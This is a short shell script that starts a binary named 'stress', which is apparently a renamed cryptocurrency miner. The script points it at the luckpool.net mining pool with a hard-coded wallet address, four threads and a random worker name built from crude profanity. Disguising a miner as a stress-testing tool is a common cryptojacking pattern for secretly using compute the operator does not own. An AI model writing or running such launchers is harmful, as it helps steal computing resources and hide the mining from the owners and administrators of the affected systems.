#!/bin/sh

FUCK=$(echo NGENTOD-$(shuf -i 1000-9999 -n 1)-GAYA)
./stress -v -l na.luckpool.net:3956 -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t 4 -p x
